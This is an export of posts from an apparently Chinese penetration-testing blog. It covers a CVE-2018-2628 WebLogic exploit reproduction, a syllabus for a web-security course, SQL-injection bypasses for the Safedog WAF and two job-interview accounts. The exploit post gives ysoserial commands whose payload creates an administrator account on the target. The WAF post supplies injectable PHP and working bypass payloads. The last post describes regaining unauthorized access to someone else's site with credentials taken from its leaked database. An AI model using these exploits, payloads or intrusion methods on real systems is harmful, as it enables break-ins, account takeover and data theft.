[{"title":"CVE-2018-2628 远程命令执行漏洞复现","date":"2018-04-23T02:27:54.315Z","path":"2018/04/23/18/","text":"环境介绍攻击机：kalilinux ysoserial-master IP：192.168.3.178 靶机：win7+jdk7+weblogic 12.1.3 IP：192.168.3.194 默认端口：7001 下载：链接：https://pan.baidu.com/s/1tZKLoTGWLX2WyPBv6D26rA 密码：qhwd 或者使用docker： 123docker pull vulhub/weblogic:latestdocker run --rm -p 7001:7001 vulhub/weblogic:latest 复现过程首先下载配置靶机环境，使其192.168然后将cc.py和ysoserial下载并移植到kali linux 然后用ysoserial 生成payload，IP地址填入你的kali IP地址，监听端口 1099 12 java -jar ysoserial-master.jar JRMPClient 192.168.3.194:1099|xxd 将其生成的payload的byte取出，替换掉poc中的payload 生成的payload： payload： 替换poc： 在poc的mian函数下替换攻击的目标IP，并利用 ysoserial进行监听和命令执行 12 java -cp ysoserial-master.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 \"cmd.exe /c ipconfig &gt;&gt;c:\\ip.txt&amp;net user admin admin@123&amp;net localgroup administrator admin /add\" 最后执行 poc 看到有监听回显，则表示漏洞利用成功。 注：命令执行并不是在cmd下执行，win是在win+r的窗口下进行任意命令执行，可以通过cmd.exe调用任意执行命令。 参考资料https://github.com/jas502n/CVE-2018-2628 https://mp.weixin.qq.com/s?__biz=MzU0NzYzMzU0Mw==&amp;mid=2247483673&amp;idx=1&amp;sn=45360b4ed1c95947088121b28cb1e45e&amp;chksm=fb4a21f1cc3da8e748b3ac6e37ac483b917857c2338b9c3f7d315c842157397e7435a7c02bb8#rd","tags":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://fjhack.me/tags/漏洞复现/"}]},{"title":"关于想做Web安全基础培训的那些事","date":"2017-09-22T11:20:23.016Z","path":"2017/09/22/17/","text":"前言这段时间脑子一热，突然想和朋友一起做关于Web安全的基础培训，以前也有这样的想法，只是一直没有尽力去实施，现在闲下来了，和朋友一拍即合，就想干点有意义的事情，总比整天无所事事的好。当然，也为了赚点小钱，何乐而不为呢？我们不求能做多大，(没想过做多大，做太大我们也管理不过来)只想安安逸逸的做点自己想做和能做的事情就行了，很多朋友，不管是看热闹的大佬，带着嘲讽buff的pen手，还是真心想学技术的萌新，都是看到了我们的广告才访问到我的blog，带着很多问题来的，所以我尽量会把问题讲的详细明白一些。 问题一：你们技术怎么样？凭什么教我？ 答：说实话，我们讲师技术并不算高手，如果硬是要说一个水平的话，只能说中下，真正的大佬说实话，实力不敢相信，我们只是刚刚毕业没多久的大学生，接触Web安全快四年，我个人也曾在某单位做过一段时间的渗透工程师，做过几个项目，当然，也还是菜鸟，但是对于刚刚想接触这个方面或者技术的朋友，我个人感觉还是有能力带动的，也当做是给自己的锻炼。 问题二：你们讲课质量怎么样，万一我听不懂怎么办？ 答：讲课质量的话，我也看过很多套课程，每个人都有自己的风格，我们只能尽量去讲我们知道的，不知道的东西我们不会扯太多，不然会误人子弟,当然，提问的话是越多越好，:)我们会很详细的去讲一些知识点，因为是基础教学，所以把每个人都当做啥也不懂的小白，尽量保证每个人都能理解和学习到，对于不懂的东西可以当场或者线下提出来，所以不用担心听不懂的概念。 问题三：一套课程下来大概多久可以学完啊？ 答：我们制定的一期时间大概是20-25天左右，具体时间再根据情况调整，一天的课程时间控制在2-3小时以内，会把教程，工具，视频打包出来，方便课后学习。 问题四：你们的课程和其他课程没什么区别啊，凭什么要收费，还要收费这么高？ 答：区别的话，其实国内大多的课程都没有区别，都是一个体系，我们会想办法让我们讲的东西更加不同吧，只能这样，没办法，这个收不收费这个问题，说句不好听的，不交钱你能好好学么？当然，开玩笑的，但是请记住，天下没有免费的午餐，我们没有强迫任何一个人必须报我们的培训班，至于收费价格问题。对比其他的教程，我个人觉得，真心不贵，如果觉得不合适，请出门左拐，有1K-2K的培训，谢谢。 问题五：你们是不会搞黑客培训啊？是不是培训出来就可以做黑客啊？ 答：首先，我们不是黑客，在者，黑客现在这是个贬义词，没人敢戴这个帽子，具体内容请下翻课程表，我们做培训的目的也是为了赚钱，不说那些深明大义的话，学到的东西就是你拿到的剑，做好事坏事，全看你自己，与我们无关。 问题六：你这算是渗透培训吗？明明就是脚本小子！ 答：额，如果您硬是认为说我们在培训脚本小子或者脚本老子的话，那就是吧 XD 我能想到的也就这么几个问题，欢迎大家补充，最后说几句：这是我们第一次做培训，我们会尽自己的全力去做，无论成功或者失败，至少自己尽力了，所以，谢谢观看！有缘再见。 下面附上课程大纲表： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117 WEB基础渗透测试线上培训大纲 暂定 会增加 进度会根据学员吸收能力减慢或加快第一部分【基础篇】 第一天 1.1Web安全简介 ---什么是渗透测试，了解常规的渗透过程，常见的渗透系统 1.2漏洞演练平台dvwa搭建 ---第二天 2.1 HTTP协议 ---深入Web请求流程 2.2 常规网站结构的讲解 --- whatweb常见的服务端口,脚本语言,服务器操作系统,数据库知识讲解 2.3信息收集 ---Google hacker Whois Nmap DirBuster第三天 3.1漏洞扫描 burpsuite各个模块 AWVS安装 扫描 结果分析第二部分 【SQL注入】第四天 4.1浅析SQL注入原理 4.2SQL注入分类 ---按参数分类:数字型/字符型/搜索型 按提交方:POST/GET/COOKIE/HTTP头 4.3不同SQL数据库手工注入(上) ---ACCESS第五天 5.1不同SQL数据库手工注入(中)---MSSYQL 5.2不同SQL数据库手工注入(下)---MYSQL第六天 6.1SQLMAP使用与进阶第三部分 【XSS跨站脚本攻击】第七天 7.1 XSS原理浅析 7.2 XSS分类 ---6.2 三种：DOM型，反射型，储存型第八天 8.1 XSS测试实战 第四部分【上传漏洞】第九天 9.1 Webshell一句话木马制作 --- 什么是webshell? 图片马 9.2 解析漏洞 ---iis、nginx、Apache 第十天 10.1 客户端检测绕过(javascript 检测) 10.2 服务端检测绕过(MIME 类型检测) 10.3 服务端检测绕过(目录路径检测) 10.4 服务端检测绕过(文件扩展名检测) 10.5 黑名单 白名单检测 10.6 .htaccess 10.7 绕过(Waf)上传拿shell的思路技巧第五部分 【其他扩展】第十一天 11.1 Web后台暴破 ---burp、http fuzzer 11.2 Hydra使用第十二天 12.1 ARP 12.2 ARP中间人/毒化攻击 12.3利用kali攻击交换机MAC地址容量表第十三天 13.1 STP生成树攻击 13.2 DNS劫持攻击 第十四天 14.1 MSF的讲解与使用(获取shell/漏洞攻击/提权/CVE攻击等)第六部分 【提权】第十五天 15.1常规的提权思路 第十六天 16.2利用Mysql数据库提权 16.3利用mssql数据库提权第十七天 17.4利用Exp漏洞提权 17.5利用远控提权 第十八天 18.6第三方软件提权 第十九天 19.6克隆账户提权 19.6阿里云Key提权","tags":[{"name":"感言","slug":"感言","permalink":"http://fjhack.me/tags/感言/"}]},{"title":"WAF注入绕过--安全狗","date":"2017-07-22T12:05:11.682Z","path":"2017/07/22/16/","text":"前言写这篇博文的原因，是因为前段时间看了接地气表哥的一篇关于利用“宽字节”的姿势，进行绕过安全狗正则匹配的帖子，有一句话让我印象深刻 “连WAF都不会绕，都不好意思说自己是搞渗透的” 碰巧那时候也和朋友一起在研究WAF的绕过，确实，WAF这个东西是很讨人嫌的，明明知道漏洞在哪，但是WAF总是把你和漏洞隔开，唯一的办法就是绕过它，所以自己寻找了一些前辈们写的针对于WAF绕过的文章进行研究，虽然很多姿势都已经失效了，而且还是有很多不懂得东西，但是前辈们提供的思路确实拓宽了自己的视野，最后还是研究出来了针对于安全狗的注入绕过，用接地气表哥的话来说“这就是水到渠成的问题”，只要去研究,总会成功，下面是个人在研究过程中的一点点总结，写的可能不是很好，主要提供思路，有不对的地方，请指出。 正文个人认为WAF分为三大类： 一丶云端WAF：这种类型的WAF，相对来说还是比较多，通常是CDN包含的waf，当DNS解析时，用户请求的数据包会首先被云端的waf进行检测，检测完毕确认没有问题后再提交给真实主机，常见的几款云端waf有“加速乐”，“百度云”，“创宇云”，“安全宝”等等。 二丶硬件WAF，ips/idsWAF：这类WAF的话，个人碰到的比较少，但是还是接触过比如“深信服”，“神州数码防火墙”，“华为防火墙”等等，因为这种类型的waf专门用于在硬件防护设备上，用户流量在进入到达路由进入主机之前会先将流量转入WAF设备进行流量清洗和拦截，然后在把数据包传输给主机，达到一种过滤的效果，如果发现危险数据，就会根据相应设置的策略进行丢弃或者阻拦处理。 三丶应用层WAF：这类WAF是碰到最多的但是个人感觉也是比较好绕过的一种，在主机上预装这种防护软件，监听所有进入主机的web流量是否非法，功能比较完善，常见的有“安全狗”，“云锁”，“护卫神”，“360主机卫士”，“D盾”等等。 根据 白帽先知社区’从容‘大佬的研究，当WAF的Rule相似的时候，会互相干扰，做过那个电脑装杀五六个杀软开机蓝屏的实验的朋友都应该明白这些waf也是互相排斥的，所以有时候也可以利用这儿特性进行绕过，但是我个人安装的三款应用层WAF，“安全狗”，“云锁”，“360主机卫士”做测试的时候，暂时没有发现这类问题。 因为个人碰到的最多的WAF是安全狗，所以针对安全狗的绕过如下。 环境用的是phpstudy集成环境 php+阿帕奇+win2003[本地虚拟机]+mysql 因为虚拟机这样搭建比较方便，mysql+php碰到的也比较多，所以选择使用这个架构，但是不清楚在测试的时候，集成的环境会不会有其他bug之类的。 PHP代码如下：123456789101112131415161718192021222324&lt;?$id=$_REQUEST['id'];$conn = mysql_connect('127.0.0.1','root','root');if ($conn) &#123; echo \"ok!\"; &#125;mysql_select_db('test',$conn);echo $id.\"&lt;br&gt;\";$sql=\"select * from user where id=$id\";echo $sql.\"&lt;br&gt;\";$result=mysql_query($sql);while($row = mysql_fetch_array($result))&#123; echo \"用户ID：\".$row['id'].\"&lt;br &gt;\"; echo \"用户名：\".$row['username'].\"&lt;br &gt;\"; echo \"用户密码:\".$row['password'].\"&lt;br &gt;\";&#125;mysql_close($conn);echo\"&lt;hr &gt;\";echo\"你当前执行的sql语句为：\";echo\"select * from user where id=$id\";?&gt; 利用小迪教程里的php代码进行了一些修改，设置为request接受参数，这样方便检测POST和GET的区别。 安全狗的版本为阿帕奇V4.0正式版，http防护功能全部开启最高等级。 从最简单的注入判断开始，一般的注入点显错型注入是最多的，利用的最多的就是 and，or，xor这种类型的布尔值判断，通过手工测试发现 在GET下拦截了 and 1=1and 1 like 1or 1=1or 1 like 1 不拦截 ‘单引号xor 1=1xor 1 like 1 在POST下 andorxor 均未被拦截，可以正常提交判断。 继续测试 order by 猜长度在GET和POST下也都可以用。 但是当爆显错位的时候，就开始出现拦截了。 因为爆显错位的时候用到了 select 和union ，那么肯定是某个语句被安全狗的正则匹配上了，通过测试发现。 单纯的提交select和union，from不会被拦截，当几个语句同时出现，就会被拦截。 在GET下尝试 大小写混编 192.168.13.129/4/1.php?id=-1+UnIon+SELEct+1,2,3,4,5 – POST下可以利用大小写混编获取到显错位，但当进行查询user(),database()这些函数信息的时候会被拦截 URL转码 192.168.13.129/4/1.php?id=-1%2f%2a%21%75%6e%69%6f%6e%2a%2f%2f%2a%21%73%65%6c%65%63%74%2a%2f%31%2c%32%2c%33%2c%34%2c%35%20%2d%2d POST下利用大小写混编获取到显错位，进行select和union查询，但当进行查询user(),database()这些函数信息的时候会被拦截 内联连接注释 192.168.13.129/4/1.php?id=-1/!union//!select/1,2,3,4,5 –会被拦截 POST下内联注释可以正常提交,部分函数也可以正常执行。 @@version_compile_os@@datadir这种带有@被拦截，说明安全狗的规则里面匹配了@，通过证实发现确实如此，单纯的在显错位加入@，直接被拦截，尝试各种编码，内联注释也没绕过，想到替换但是没找到能够替换@这个符号的值，因为对注入没有太大的影响所以没有深入去研究，继续在POST下进行尝试，发现通过简单的内联注释就可以完完全全的绕过安全狗的POST 匹配规则。 关于内联注释的解释： / …. / 在大部分语言中都一样是注释。这个之中的语句是不被执行的。但MYSQL中 为了保持兼容，比如从mysqldump 导出的SQL语句能被其它数据库直接使用，它把一些特有的仅在MYSQL上的语句放在 /! … / 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中它会执行。 那么内联注释的绕过方法只适用于MYSQL。。。。XD 继续 通过发现，在POST接受参数下，安全狗的匹配规则非常弱，但是还是没有突破在GET传参下的绕过。毕竟一般的网站都是接受GET的传参比较多，尝试了一些前辈的方法，参数污染，替换字符等等感觉都不行了，尝试使用接地气老哥的宽字节替换手法，看看是否可以绕过安全狗的匹配正则，反正黑盒绕过就是猜，万一找到了安全狗正则疏忽的地方呢？而且，确实接地气老哥这个思路很新颖，利用宽字节替换sql字符语句。 宽字节 对照： union = uю%69яю这里把i不用宽字节 直接url编码 其他的字符都用对应的宽字节 select = こхlх%уt //t不编码 其他的都宽字节 中间插上% from = цR%яэ //宽字节+% 空格=%20=%ва //в是2的款字符 а是0的宽字符 , = Ь //,号的宽字节 通过测试发现，利用原理个人理解就是，在阿帕奇容器中，当用户只有提交POST的数据在经过阿帕奇的二次解析后，把原本是特殊符号的字节正常传入数据库，执行sql语句。利用宽字节的原因就是为了避免在参数进入容器解析前被WAF的正则匹配到，毕竟大多的WAF都是基于正则匹配黑名单的原理。 当 select from union 都进行宽字节转换的时候，还是没法正常，绕过，接地气在文章里面也说明了，当这三个语句同时出现并且被执行的时候，就会触发安全狗的正则，那么尝试是否可以进行内联注释呢？ id=-1 /!uюiяю//!こхlхуt/1,group_concat(table_name),3,4,5/!цRяэ/information_schema.tables where table_schema=0x74657374 用内联注释确实可以完全绕过POST下安全狗的正则，但是内联注释后会把宽字符的某些字节给注释，达不到最初的全部替换效果，比如 union中进行转码的 i = %69，在内联注释后会被注释。但是总体来说影响不大，既然宽字符能够正常在POST下解析，那么是否可以用来单纯替换那些被禁止的函数呢？比如大小写混编的函数，测试发现，user(),database()，单纯的把某个字母替换成宽字节一样也会被拦截，主要还是把select union from给过掉才行。 小小总结一下POST下的绕过：在POST接收参数下，union和select利用内联注释可以完全进行绕过安全狗的匹配，from不需要内联注释也可以绕过，说明安全狗匹配了union和select，利用宽字符加内联注释可以绕过union和select的组合，但是没办法绕过函数，利用注释，宽字符，URl编码替换函数，也不行，说明安全狗在post接参下匹配了危险函数和union，select的组合。 一般的绕过手法总结： 注释[内联注释,数据库特性] 编码转换[双重编码，URL编码等] 替换关键字[替换宽字节，特殊符号,emoji等等] 缓冲区域溢出[利用Mysql的底层溢出，WAF检测机制长度等] 参数污染[构造多重提交参数] 扰乱正则[尝试扰乱WAF的一些正则匹配] 等等。 总结虽然绕过waf有点眉目了，但是却达不到自己心中想要的效果，有点不甘心，继续百度前辈们的方法进行绕过，在百度的过程中，发现很多有意思的绕过姿势，比如说，利用emoji表情绕过，mysql溢出绕过，等等有意思的方法。虽然有些已经用不了了，但是自己确实拓宽了眼界，也给自己提供了思路，最后再换了思路的情况下成功的绕过了安全狗的GET参数注入，提示的话，不是从WAF的正则黑名单进行绕过，可以进行尝试扰乱它的正则。 具体的绕过姿势恕我不能直接发出来，因为这种东西就像接地气说的，见光死，太多像乌云红老师一样的人了，如果有心研究的表哥，肯定能研究出玩完美的绕过方法，毕竟连我这个小白都搞定了，当然，我们也可以一起探讨研究，毕竟Blog写的太乱。 ：） 虽然注入漏洞已经快杜绝了，但是说实话，安全狗确实是比较垃圾的WAF，POST下的正则匹配简直不忍直视，但是还是能防住一些不懂原理的脚本小子，而且在应用人群也是比较多的，绕完了安全狗就得继续绕过其他的WAF(，云锁，360主机卫士等，还有云端WAF肯定是趋势)，有了经验应该会比较好绕过一些，但是黑盒测试不就是看运气吗？ 最后借用表哥的一句话总结：连狗都过不了还好意思讲我是搞渗透的！ 参考文章： https://forum.90sec.org/forum.php?mod=viewthread&amp;tid=9423 https://www.secpulse.com/archives/53328.html http://www.freebuf.com/articles/web/36683.html","tags":[{"name":"WAF-bypass 绕过","slug":"WAF-bypass-绕过","permalink":"http://fjhack.me/tags/WAF-bypass-绕过/"}]},{"title":"记一次面试经历(评测中心)【下】","date":"2017-06-30T12:18:24.937Z","path":"2017/06/30/15/","text":"因为前段时间一直在找住所，所以博客一直没有更新，确实住所是个大问题，现在暂时安稳了，合天那边的话估计我是GG了，没有给消息是否通过所以，还是恭喜自己找到了自己的一份实习工作，下面是我的面试经历，希望能给在找工作的朋友，提供一些帮助。我面试的这家公司是一个事业单位，华中测评中心，面试的职位是渗透工程师，但是过程说实话，比起合天，还是非常简单的。 公司在一个酒店的旁边，说实话找了很久才找到，到了公司联系了HR之后是一个年轻的大兄弟带我进入中心，电子大门很有意思。 也没说什么，直接扔了一套题目给我，题目都是很基础的题目，但是覆盖的面积很广，下面是做题目的时候拍的照片，仅供参考。 因为是边做边拍的，没有排版，凑合看吧，其实说实话也没什么难点，虽然我最后一题【就是那个cookie欺骗】没做就被叫去面试了，虽然看不懂所有的代码，但是猜还是能猜出来的 ：） 做这些题目大概做了二十多分钟，还在纠结最后一题的时候，被刚刚的小哥叫去面试，我说还没做完。。，他说没事，先去面试，这个不重要。 好吧，不重要，亏我做的那么起劲。 把我带到一个会议室，面试的一共有五个人，两个女的，妹子长得不错，好评。 先让我填的一张表格，和合天的那个差不多，但是唯一不同的是有个期望薪资的选项，我想了想合天的事情，果断填了2K，写完交给妹子，然后就开始了问答环节。 自我介绍，职业规划之类的东西就不用重复叙述了，具体情况具体回答。 HR：看了你的简历，你能适应出差吗？因为工作会，经常出差。 我：恩，可以适应的（多出去走走没坏毛病。） HR：你想去北上广这几个城市发展吗？ 我：我感觉现在还是留在湖南比较好，毕竟个人能力和经验都有限。 HR：如果入职的话，你能马上开始进入项目吗？ 我：如果有机会参与项目，并且有前辈带的话，很想参加！ 基本也就这些几个问题，没什么不同的，具体情况具体回答，技术方面的话，单位也就问了两个问题，问问题的是个大佬 （事后才知道的，渗透搞了八年，现在跟这位大佬在一个小组，他是渗透组长，跟他学到了很多） HR：你一般是怎么进行渗透的？ HR：你在渗透过程中有没有碰到什么难题呢？ 等等，我的回答就不给出来了，毕竟各有各的回答，但是要点就是要能够突现自己的能力。 基本的面试也就差不多了，谈谈入职以后的情况吧。现在在这家单位呆的挺好，认识了很多人，有实习生，有大佬，也交了一些朋友，个人感觉能从他们身上学到很多东西，也参与了比较大的一个项目，现在还在江西，明天又得奔赴上海，从事的是渗透测试这块的工作，工作差不多也快一个月了，个人感觉学到的项目经验就是 “规矩” 没有规矩不成方圆，你不再是一个野路子，可以瞎搞，瞎玩。你做的东西就得自己去承担后果。 做项目和平常的渗透是有很大的区别，比如说，当你对一个网站做渗透测试的时候，一般我们是怎么快得到权限怎么来，扫描器，等等一把梭，毕竟不想手动，扫不到的话，成功率会降低很多很多，而且当开那些大型扫描器的时候， 还很容易把网站给扫死，这很平常。但是在做项目的时候，并不是看你拿到的权限有多少，而是看你找到的危害有多大，有可能你利用一个stur2漏洞直接提权服务器，但是又有什么用呢？你最终的报告是要给客户看的，不是每一个客户都是 技术出身，他们关心的只是数据泄露了多少，造成了多少损失，而不是你拿下了多少权限，这点我深有体会！切记吧。还有的区别就是渗透的方式不同，不能用惯用的方式去渗透，就我做的这个项目而言，漏洞扫描器，基本是没用的 首先，根本没那么多漏洞去给你扫，很多业务系统就一个登录框，你怎么扫？其次，扫描器会影响客户系统的正常业务办公，这是大忌，不能影响客户的正常业务。所以，用工具扫来扫去，是不明智的选择，说实话，就我所见的，一个渗透工程师， 可能一个burp就可以搞定一切了。不需要各种工具，（burp确实也是神器），所以，不要一做渗透就是扫来扫去，测来测去，连个账号密码都没有，测了也是白测，亲身体会。 很久没更新了，总结了一下自己的所看所学 发现差距在于，经验，意识，技巧，耐心，当然还有运气，就跟打游戏一样，不需要0day（当然，你有0day的话你也不会来这个单位），外挂和工具只是简单辅助而已。 也许你可以靠一个简单的逻辑漏洞就造成内网漫游，获取到各种权限，或者利用burp fuzz爆破一个邮箱，从而拿下邮箱系统，而不是要去挖那些很严重的漏洞，比如命令执行，SQL注入，漏洞是死的，说实话，我挖的注入很多但是真正有用的没几个，一个站的库就有好几十G的数据，当然，也不是说完全没用，你获取的到数据如果是很重要的数据呢？但是前提是你要能找到存放的表，所以，思路才是最重要的！ 最后文章总结一下吧，写的有点杂，只是想把自己想表达的一些想法表达出来，能让自己的小圈子能够互相交流学习就够了。 : ) 结尾一句话： 低调求发展，潜心习安全！ 努力成为一名合格的渗透工程师！","tags":[{"name":"经验","slug":"经验","permalink":"http://fjhack.me/tags/经验/"}]},{"title":"记一次面试经历(合天智汇)【上】","date":"2017-06-19T18:38:44.738Z","path":"2017/06/20/14/","text":"记录的关于参加合天智汇公司面试的一些个人总结，希望能够帮助一些正在寻找工作的朋友们。 我面试的第一家公司是长沙这边的合天智汇的尽量记得的详细过程因为在freebuff上面看到了它们发布的招聘信息，然后尝试投了一份简历，毕竟已经大二了，需要找份工作，也可以学到更多的东西，大概过了两天HR就给我打电话，正巧那天在睡觉没有接到，醒来后回拨了个电话，对话内容如下： HR：您好，请问你是那个。。。。？(有点尴尬，忘了我的名字) 我：对，是的，我是XX HR：哦，是这样的，这边我们收到了你的简历，上面写你现在就读于大二，那么你是准备做个短期实习？ 我：这个的话，因为我们大三可以直接寻找工作，所以可以跟学校申请长期实习的。 HR：恩，好的，那我把你的简历给领导看看，合适的话，我会打电话通知你面试。 我：恩，好的，谢谢，请问您是哪一家公司（因为还有一家公司也投了简历，所以不清楚这是哪家公司） HR：我们是合天智汇的 我：恩，好的，谢谢。 过了会，打电话过来谈了下，下周星期一的上午十点钟面试，发了公司地址，毕竟有面试了，所以看了些关于面试的技巧，资料，等等，坐等面试。 因为合天距离学校有一段时间的路程，所以大概星期一七点多就开始坐地铁，确实很远，换乘地铁还得换成公交才能到花了将近两个小时，因为失眠一个月，面试头一晚也没睡，感觉身体贼累，只能强打精神。 求治疗失眠良方！ : ( 到达合天差不多九点左右，没地方去所以先进合天看了看，观察了下环境还不错，很浓重的IT公司味道，找到前台妹子，然后跟她说是来面试的，她给了一张人员信息表，填完后，把我带到会议室，联系了人力资源部的开始面试。 只能早到不能迟到，这是真理！ HR是个女的，短发，大概二十六七左右，黑框膜法师眼镜，声音不是打电话的那个，手里拿的刚刚填的人员信息表，看了一眼信息表然后开始流程 首先得自我介绍，这是基本，大概介绍一些自己的一些基本情况，专业，会什么东西，表达自己对网络安全这方面的兴趣等等，这个的话因人而异，尽量多说一点，把意思表达清楚，因为面试的所有内容，边说她也会边在一个本子记录。 然后会聊你的学校专业，个人家庭情况，例如，因为我专业是网络工程，也就是配置路由器交换机和网络搭建那块，和面试的网络安全工程师不是一个专业，所以她会问你学习的知识，怎么会想到来应聘这个职位。 我的回答大概意思就是说，网络安全这块完全是出于自己的兴趣，比如说自己通过各大论坛，各种教程，以及和朋友交流进行学习，应聘这个职位的话，是想更好的往这个方面发展等等。 然后就是职业规划，职业规划的话，个人感觉公司就是想看你准备留多久，或者你以后的意向如何，毕竟不能白白给别人公司培养人，回答的话，尽量回答准备长期留在公司的意向，比如说，自己刚刚出来找工作经验不是很丰富，很想待在一个公司好好学点东西，增加自己的社会经验和提高自己的技术，然后表达自己很想为公司创造价值，当然，公司不会真正让一个实习生去创造多大的价值，毕竟实习生，只是想看你的一个意向，因为我看到那人默默地点了几下头，应该是表示认同吧，然后会问你是不是准备长期留在本地发展，有没有想过会去一些大城市，比如说北上广，这个回答的话，肯定是准备留在本地发展，北上广的竞争太大了，不太适合我们这些刚毕业的人，这些话尽量往想呆在这个公司去说，当然，前提是你真的想待在这儿公司。 然后问了几个问题，例如你是怎么了解到这个招聘的，你来这里花了多久时间，如果工作的话是不是准备在这边租房子，你期待的薪资，以及你多久能够上班，等等。 比较关键的几个问题，对话如下： 人力：你是怎么了解到这个招聘的？ 我：我实在fb上面看到合天发的招聘。 人力：freebuff啊，你期待的薪资是多少？ 我：3K-4K，左右吧。 人力：这个薪资你是怎么了解的？你是问了其他的朋友，还是？ PS：这个确实是个经验，我对薪资的要求太高了，长沙实习期的薪资是非常低的，一般是1K-2K多，杭州和北上广那些地方就比较高，但是绝对不能要太高。 我：大概对比了几家公司，感觉差不多吧。 人力：那你的最低期待薪资是多少呢？ 我：最低薪资的话，不能低过2K，毕竟要在长沙生活。 人力：哦，你这个薪资的话在实习期要求比较高，当然，薪资是从你的个人能力还有其他的方面综合考虑的，现在还不太了解。看你的信息是XX的，你来应该这里花了很多时间，大概一个多小时吧？ 我：大概两个小时左右 人力：那到时候工作了怎么办？每天不可能花这么久的时间吧？ 我：这个的话，会和朋友商量在附近合租。 人力：恩，租房子是可以的，那么你最快多久能上班呢？ 我：大概六月底左右。 人力：恩，要搬东西吧？ 我：不是，呵呵，要考试。 人力：考试啊，还没考完，那么大概六月底考完是吧，这边的话了解了你的情况，现在有三个部门还缺人，安全技术部，培训部，和销售部，你有没有想去销售部呢？因为那样的话薪资会比较高，而且你刚出来实习，能够学到更多的信息，或者说，网络部门那边，因为你是学这个专业的，运维和编辑你会吧？你会考虑这两个部门吗？ 我：销售部的话，我感觉我个人喜欢钻研技术这方面的东西，销售的那些东西不是很了解也不是很懂，网络部的话，对这方面的兴趣不是很大，还是想去技术部。 人力：恩，公司的一些基本待遇你都了解吧，但是实习生的话是没有五险一金的。 我：恩，好的（说实话，我都不知道有啥待遇，而且五险一金是什么的东西？） 人力：恩，好的，这边的话，我们大致了解了你的基本情况，我这边是人力资源部的面试，觉得你还不错，如果你想继续面试的话，我去联系技术部的负责人，麻烦你在这里等下。 我：好的，谢谢。 人力资源部的面试算是结束了，个人感觉还是良好，对答还是没有什么问题，也没有表现的紧张，可惜不是打电话的那个妹子，毕竟她手里有我另一份简历，刚刚写的那个信息表完全就是给人力资源看得，如果觉得你这个人总体还不错的话再让你继续面试。 技术部来的是一个大概二十五六岁的男的，没戴眼镜，黑T恤，一米七多，拿的我最开始投的那份简历，对话大致如下： 技术部：你只搞web渗透？ 我：是的 技术部：你会不会审计？ 我：这个不会，但是有所了解，语言这方面是弱项，编程的话，正在自学python。 技术部：不会审计啊，你学python会写什么东西？ 我：简单的爬虫还是会写，比如说，爬一个补天的漏洞索引，写一些简单的脚本，但是不是很熟练。 技术部：你学这个多久了？ 我：大概大一开始真正接触，一两年吧。 技术部：大一啊，那时候乌云刚刚关了啊。 我：还好，我在乌云呆了几个月。 技术部：恩，看你简历，工具都会用吧？ 我：常用的工具都会用。 技术部：会用工具，不会编程，这就有点麻烦 我：哈哈，脚本小子吧，还好了，肯定会学编程的，正在学python。 技术部：你觉得你的技术在什么水平或者阶段？ 我：我感觉我的技术，在中等偏下吧，在一个瓶颈，打破编程那个瓶颈可以学到更多的东西。 技术部：恩，burp你会用吗？ 我：这个一些常用的功能，抓包改包，被动扫描，爆破，爬虫还是会一些。 技术部：那你有没有做点小生意，就是说。。。 我：你说的是海产吧，这个没有，不敢做。 技术部：那你的朋友有没有做的呢？ 我：这个的话，也没有。 技术部：恩，那你一般在哪些漏洞平台挖洞？ 我：以前喜欢在补天，乌云，教育平台挖。 技术部：教育平台，没听过啊。 我：最近出的。 技术部：哦，那你一般的挖洞的过程或者思路是怎么样的？ 我：一般的话，会根据自己的经验去测试一些比较常见的漏洞，比如说他们给我一个站。。。 技术部：他们是谁？(这明显套话嘛。。) 我：类似于补天和乌云的众测平台 技术部：哦，继续。 我：我拿到一个站的话，会根据自己的经验去测试一些比较常见的漏洞，如果有的话会继续深入，没有的话，再想其他的办法。 技术部：恩，那你对提权这块怎么样？ 我：提权这块的话，懂一些不是很熟练，后渗透这块不是很厉害，一般都是挖前端的一些东西。 技术部：一般你是怎么提权的？ 我：一般的话，首先查看权限，看权限的大小利用不同的办法，例如权限大的话尝试直接提权，权限小的话，尝试看一些补丁信息，上一些exp，如果有waf的话，尝试用一些免杀的工具或者想办法绕过waf，还有就是看数据库的一些情况，比如说1433和3306，恩，这块我也不是很熟练，大概就这些吧 （这里没有回答好，主要被他那句他是谁给雷到了，太坑了吧，太明显的套话了。） 技术部：恩，听说你要的工资挺高啊。 我：。。。。两千多不高了吧，毕竟要在长沙活。（这个个人感觉真的不高。） 技术部：恩，毕竟实习期，工资待遇这方面的话，我会跟领导商量的。 我：恩，好的，谢谢，那我继续在这里等还是？ 技术部：这个啊，你先回去吧，这两天给你消息，好吧？ 我：恩，好的谢谢。 然后一脸懵逼的出了合天，又开始了两个小时的又困又累的路程。。。 总结： 个人总体感觉还是不错的，不管是否面试上了（更希望面试上），总学到了很多经验，比如说，薪资的问题，以及一些套路。。。，当然，个人不足的地方还有很多，比如审计，这个加分项自己肯定是没有的，还有就是技术部面试的时候实在困得不行了，感觉自己回答的云里雾里，当然，也当做教训吧！星期二还约了一家公司面试，并且有笔试，也会记录下来！虽然记录的不是很好，但是希望能帮助一些正在求职的朋友，也希望自己下一次好运吧！ ：） 以上内容仅供参考！我的个人简历模板,大牛们不要社我！","tags":[{"name":"经验","slug":"经验","permalink":"http://fjhack.me/tags/经验/"}]},{"title":"续失败后的卷土重来，社工重新夺权后台","date":"2017-06-10T08:21:26.050Z","path":"2017/06/10/13/","text":"衔接上文链接：http://fjhack.me/2017/06/02/12/ 还是上次的非法站 IIS8.0+win2012+mssql上次失败的结果是什么权限都没有了【数据库权限，服务器权限，shell权限】，但是不甘心，对着扒下的源码和数据库，使劲鼓捣研究，虽然并不是很懂代码审计,但是皇天不负有心人，终于发现了突破口，为我重新获得了权限，虽然权限不是很大。 突破口在数据库的短信接口数据中： 有了账户密码，和连接地址，按道理，连接过去登录就OK了，但是事情没有那么简单，连接过去是这个东西，一串数字，像是时间戳。 按照习惯去掉后缀url，跳转到了一个登陆的界面，利用上面的账号密码尝试登陆，但是登录发现出错，心想，不可能啊，用户密码和地址都没毛病啊，看了下报错信息，发现是登录地址出错。难道是另一个地址登录？手动猜了一下url，还存在一个login的登录窗口，估计是管理员的登录窗口，但是界面布局都是一样的，不仔细看真看不出来 http://xxx.xxx.xxx.xxx/msg/login.jsp 